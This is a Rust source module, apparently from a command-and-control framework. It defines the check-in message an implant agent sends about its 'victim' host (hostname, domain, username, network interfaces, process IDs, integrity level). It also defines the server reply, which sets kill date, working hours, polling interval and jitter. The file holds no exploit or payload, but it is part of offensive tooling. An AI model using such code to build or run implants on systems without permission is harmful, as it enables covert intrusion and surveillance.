//! The checkin module contains the structs used to check in the agent and the response to the
//! checkin.
//!
//! The checkin struct is used to check in the agent and contains information about the agent.

use alloc::{string::String, sync::Arc, vec::Vec};

use serde::{Deserialize, Serialize};

use crate::{
    metadata::{Metadata, WithMetadata},
    network_interface::NetworkInterface,
};

/// The checkin struct used to check in the agent
#[derive(Serialize, Deserialize, PartialEq, Eq, Clone)]
#[cfg_attr(feature = "server", derive(Debug))]
pub struct Checkin {
    /// The OS name
    pub operative_system:   String,
    /// The victim hostname
    pub hostname:           String,
    /// The domain of the victim
    pub domain:             String,
    /// The username of whose runs the agent
    pub username:           String,
    /// The internal IP(s) of the victim (multiple network interfaces)
    pub network_interfaces: Vec<NetworkInterface>,
    /// The process ID of the agent
    pub pid:                i64,
    /// The parent process ID of the agent
    pub ppid:               i64,
    /// The process name of the agent
    pub process_name:       String,
    /// The integrity level of the agent
    pub integrity_level:    i16,
    /// The current working directory of the agent
    pub cwd:                String,
    /// The metadata of the struct
    pub metadata:           Option<Arc<Metadata>>,
}

// Safety: The struct is safe to send and share between threads
unsafe impl Send for Checkin {}
// Safety: The struct is safe to send and share between threads
unsafe impl Sync for Checkin {}

impl Default for Checkin {
    fn default() -> Self { Self::new() }
}

impl Checkin {
    pub const fn new() -> Self {
        Self {
            operative_system:   String::new(),
            hostname:           String::new(),
            domain:             String::new(),
            username:           String::new(),
            network_interfaces: Vec::new(),
            pid:                0,
            ppid:               0,
            process_name:       String::new(),
            integrity_level:    0x0000,
            cwd:                String::new(),
            metadata:           None,
        }
    }
}

impl WithMetadata for Checkin {
    fn get_metadata(&self) -> Option<Arc<Metadata>> { self.metadata.clone() }
}

/// The checkin response struct
#[derive(Serialize, Deserialize, PartialEq, Eq, Clone)]
#[cfg_attr(feature = "server", derive(Debug))]
#[expect(
    clippy::module_name_repetitions,
    reason = "The struct is named `CheckinResponse` because it represents the response to a checkin."
)]
pub struct CheckinResponse {
    /// The unique identifier of the agent, required to poll for tasks
    pub id:               String,
    /// The unix timestamp of the kill date, if any
    pub kill_date:        Option<i64>,
    /// The working hours of for the current day (unix timestamp), if any
    pub working_hours:    Option<Vec<Option<i64>>>,
    /// The agent polling interval in milliseconds
    pub polling_interval: u128,
    /// The agent polling jitter in milliseconds
    pub polling_jitter:   u128,
}
